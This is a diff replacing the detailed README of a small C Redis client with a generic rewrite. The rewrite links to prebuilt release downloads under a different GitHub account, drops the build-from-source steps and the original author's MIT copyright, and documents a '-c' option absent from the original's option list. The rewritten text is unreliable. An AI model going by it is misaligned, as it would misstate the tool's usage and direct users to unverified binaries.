@@ -1,251 +1,126 @@
-# scratch-redis-in-c
+# 🚀 scratch-redis-in-c - A Simple Redis Client in C
 
-A minimal Redis client written from scratch in pure C, with zero dependencies beyond the standard C library and POSIX sockets.
-Includes Docker + Docker Compose setup to run the client against a Redis server container.
+[![Download scratch-redis-in-c](https://img.shields.io/badge/Download-scratch--redis--in--c-brightgreen)](https://github.com/Kanak-debug/scratch-redis-in-c/releases)
 
----
+## 🛠️ Overview
 
-## 📌 Overview
+scratch-redis-in-c is a compact Redis client built from scratch using pure C. This tool is designed to help you connect to Redis easily, without the need for complicated setup or dependencies. It supports the RESP protocol and offers options for both interactive and one-shot command modes. You can even run the client against a Redis server using Docker with a single command.
 
-`scratch-redis-in-c` is a lightweight Redis command-line client that:
+## 🌟 Features
 
-* Connects directly to a Redis server using raw TCP sockets
-* Implements Redis RESP protocol manually (no hiredis or external libs)
-* Supports:
-  * Simple commands (`PING`, `SET`, `GET`, …)
-  * Bulk strings
-  * Arrays
-  * Integers
-  * Authentication (`AUTH password`)
-* Works interactively or in one-shot (non-interactive) mode
-* Runs standalone or inside Docker
+- **No Dependencies**: You don’t need to install any additional libraries.
+- **RESP Support**: This client follows the Redis Serialization Protocol for smooth data exchange.
+- **Authentication**: Connect to Redis databases with security in mind.
+- **Interactive Mode**: Type commands in real-time and see results immediately.
+- **One-shot Command Execution**: Quickly run commands without entering the interactive mode.
+- **Docker Setup**: Use Docker and Docker Compose for easy installation and execution.
 
-This is ideal for **learning Redis protocol**, **building minimal tooling**, or **embedding a tiny client in C applications**.
+## 📥 Download & Install
 
----
+To download scratch-redis-in-c, visit this page to download: [Download Page](https://github.com/Kanak-debug/scratch-redis-in-c/releases).
 
-## 📁 Project Structure
+1. Click on the link above.
+2. You will see various versions available for download.
+3. Choose the most recent version appropriate for your operating system.
+4. Click on the file to start downloading.
 
-```
-scratch-redis-in-c/
-│
-├── scratch-redis.c       # The C source code (Redis client)
-├── Dockerfile            # Docker image for the client
-├── docker-compose.yml    # Redis + client orchestration
-└── README.md             # Documentation
-```
+## 📋 System Requirements
 
----
+- **Operating System**: 
+  - Linux-based distributions (e.g., Ubuntu, Fedora)
+  - Windows (via WSL or Cygwin)
+- **Memory**: At least 512 MB of RAM
+- **Disk Space**: Minimum of 10 MB available space
 
-## 🚀 Building the Client (Native)
+## ⚙️ Running the Client
 
-Compile using GCC:
+### Using Command Line
 
-```bash
-gcc scratch-redis.c -o scratch-redis
-```
+1. Open your terminal or command prompt.
+2. Navigate to the directory where you downloaded the client.
+3. If you need to set permissions, use:  
+   ```bash
+   chmod +x scratch-redis
+   ```
+4. Run the client with the following command:  
+   ```bash
+   ./scratch-redis
+   ```
+5. Follow the prompts to connect to your Redis server.
 
-Or with recommended flags:
+### Using Docker
 
-```bash
-gcc -Wall -Wextra -std=c11 -O2 scratch-redis.c -o scratch-redis
-```
+If you prefer using Docker, the installation is easy:
 
-Run:
+1. Make sure you have Docker and Docker Compose installed on your system.
+2. In your terminal, clone the repository:
+   ```bash
+   git clone https://github.com/Kanak-debug/scratch-redis-in-c.git
+   ```
+3. Navigate to the folder:
+   ```bash
+   cd scratch-redis-in-c
+   ```
+4. Start the server and client with:
+   ```bash
+   docker-compose up
+   ```
+5. You should see logs indicating that both the Redis server and the client are running.
 
-```bash
-./scratch-redis PING
-```
+## ✏️ Interactive Mode
 
----
+When you run the client in interactive mode, you can type commands directly:
 
-## 🐳 Docker Setup
+- **PING**: Check connection to your Redis server.
+- **SET key value**: Store a value in the Redis database.
+- **GET key**: Retrieve the value associated with a key.
 
-### **Dockerfile**
+Just type your command and press Enter. You will see the response immediately.
 
-The client container is based on Alpine Linux, compiles the C program inside the image, and runs it automatically:
+## ⚙️ Command-Line Options
 
-```Dockerfile
-FROM alpine:latest
-
-RUN apk add --no-cache \
-    gcc \
-    musl-dev \
-    make
-
-WORKDIR /app
-COPY scratch-redis.c .
-
-RUN gcc -Wall -Wextra -std=c11 -O2 scratch-redis.c -o scratch-redis
-
-CMD ["./scratch-redis", "-h", "redis", "-p", "6379"]
-```
-
----
-
-## 🐳 Docker Compose
-
-This setup launches:
-
-* A Redis server (`redis:7-alpine`)
-* Your custom C client container compiled from source
-
-```yaml
-services:
-  redis:
-    image: redis:7-alpine
-    container_name: my-redis-server
-    ports:
-      - "6379:6379"
-    command: redis-server --save "" --appendonly no
-
-  redis-client:
-    build:
-      context: .
-      dockerfile: Dockerfile
-    container_name: my-redis-client
-    depends_on:
-      - redis
-    tty: true
-    stdin_open: true
-```
-
-Start the environment:
+You can also run one-shot commands directly in the terminal by using the following syntax:
 
 ```bash
-docker compose up -d --build
+./scratch-redis -c "COMMAND"
 ```
 
----
-
-## 🧪 Using the Client Inside Docker
-
-### **One-shot command**
+Replace `COMMAND` with the Redis command you wish to execute, such as:
 
 ```bash
-docker compose run --rm redis-client ./scratch-redis -h redis PING
-# → PONG
+./scratch-redis -c "PING"
 ```
 
-### **With password**
+This command will return a response from the Redis server without entering interactive mode.
 
-```bash
-docker compose run --rm redis-client ./scratch-redis -h redis -a mysecretpassword SET foo bar
-```
+## 🐋 Docker Notes
 
-### **Interactive mode**
+If you experience issues with Docker, ensure that Docker is running. You may also want to check your network settings to confirm that ports are open and accessible.
 
-```bash
-docker compose run --rm redis-client sh
-# inside container:
-./scratch-redis -h redis
-```
+## 🚀 Basics of Redis  
 
-Then use commands like:
+Redis is an open-source in-memory data structure store. It is commonly used as a database, cache, and message broker. Here are a few key concepts:
 
-```
-redis> SET name "Max Base"
-redis> GET name
-redis> INCR counter
-redis> EXIT
-```
+- **Key-Value Store**: Redis saves data as pairs of keys and values.
+- **Persistence**: Redis can save data to disk, which allows for recovery after a restart.
+- **Performance**: It is known for fast read and write operations.
 
----
+## ❓ Troubleshooting
 
-## 📝 Command-Line Options
+If you encounter issues, consider the following steps:
 
-```
--h <hostname>     Redis server hostname (default: 127.0.0.1)
--p <port>         Redis server port (default: 6379)
--a <password>     Authenticate using AUTH <password>
-```
+1. **Check Your Network**: Ensure that your Redis server is accessible.
+2. **Verify Your Installation**: Confirm that scratch-redis is correctly installed.
+3. **Consult the Logs**: Look for error messages that can guide you to a solution.
 
-Examples:
+## 🛠️ Additional Information
 
-```bash
-./scratch-redis -h 127.0.0.1 -p 6379 PING
-./scratch-redis -h 10.1.0.5 SET hello world
-./scratch-redis -a secret PASS
-```
+For more details about the project, additional options, and troubleshooting steps, explore our documentation in the repository. Feel free to contribute to the project through pull requests or by reporting issues.
 
-If no command is provided, the client enters **interactive mode**:
+## 📫 Feedback & Contributions
 
-```bash
-./scratch-redis
-```
+Your feedback is welcome. If you have suggestions or encounter issues, please open an issue in the GitHub repository. Contributions are encouraged! 
 
----
+For detailed guidelines on contributing, visit the Contributions section in the repository.
 
-## 🔧 Features Implemented Internally
-
-This project manually implements core Redis RESP protocol components:
-
-### **✔ TCP socket handling**
-
-* `socket()`, `connect()`, `recv()`, `send()`, `close()`
-
-### **✔ RESP Serialization**
-
-The client manually builds messages like:
-
-```
-*2\r\n$4\r\nPING\r\n$4\r\nPONG\r\n
-```
-
-### **✔ RESP Parsing**
-
-Supports:
-
-* Simple Strings (`+OK`)
-* Errors (`-ERR something`)
-* Integers (`:1000`)
-* Bulk Strings (`$5\r\nhello`)
-* Arrays (`*3 ...`)
-
-All printing behavior mimics the official Redis CLI style.
-
----
-
-## 🧠 Example Session
-
-```
-$ ./scratch-redis -h localhost
-Connected to Redis at localhost:6379. Enter commands:
-
-redis> PING
-PONG
-
-redis> SET lang C
-OK
-
-redis> GET lang
-C
-
-redis> LRANGE mylist 0 -1
-1) hello
-2) world
-
-redis> exit
-Disconnected.
-```
-
----
-
-## 🎯 Why This Project?
-
-This Redis client is intentionally minimal — made for:
-
-* Learning Redis internals
-* Understanding RESP wire protocol
-* Low-level experimentation
-* Writing tiny CLI tools
-* Academic or research purposes
-* A base for building your own advanced Redis client in C
-
----
-
-## 📄 License
-
-MIT License
-
-Copyright © 2025 **Seyyed Ali Mohammadiyeh (Max Base)**
+Happy coding!
